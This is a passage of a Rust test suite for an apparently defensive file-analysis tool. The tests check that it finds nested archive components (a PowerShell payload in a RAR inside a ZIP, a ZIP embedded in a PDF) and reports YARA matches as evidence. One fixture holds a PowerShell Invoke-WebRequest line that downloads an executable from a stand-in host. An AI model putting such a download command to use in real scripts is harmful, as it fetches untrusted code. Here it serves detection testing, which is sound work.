            let mut zip = zip::ZipWriter::new(&mut bytes);
            zip.start_file("inner.rar", zip::write::SimpleFileOptions::default())
                .unwrap();
            std::io::Write::write_all(&mut zip, &rar).unwrap();
            zip.finish().unwrap();
        }

        let analysis = analyze_bytes(Path::new("outer.zip"), bytes.get_ref(), &limits());
        assert!(
            analysis
                .components
                .iter()
                .any(|component| component.nesting_path == "inner.rar/payload.ps1")
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "network_endpoint")
        );
        assert!(!analysis.boundaries.iter().any(|boundary| {
            boundary
                .detail
                .contains("RAR extraction is not implemented")
        }));
    }

    #[test]
    fn pdf_with_embedded_zip_reports_components() {
        let mut zip_bytes = Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut zip_bytes);
            zip.start_file("payload.txt", zip::write::SimpleFileOptions::default())
                .unwrap();
            std::io::Write::write_all(&mut zip, b"hello").unwrap();
            zip.finish().unwrap();
        }
        let mut document = b"%PDF-1.7\n".to_vec();
        document.extend_from_slice(zip_bytes.get_ref());
        document.extend_from_slice(b"\n%%EOF");
        let analysis = analyze_bytes(Path::new("report.pdf"), &document, &limits());
        assert!(
            analysis
                .components
                .iter()
                .any(|component| component.nesting_path.contains("embedded.zip"))
        );
    }

    #[cfg(feature = "yara")]
    #[test]
    fn yara_matches_are_evidence_not_execution() {
        let analysis = analyze_bytes_with_rules(
            Path::new("script.txt"),
            b"Invoke-WebRequest https://example.invalid/a.exe",
            &limits(),
            true,
            None,
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "yara_match")
        );
    }
}
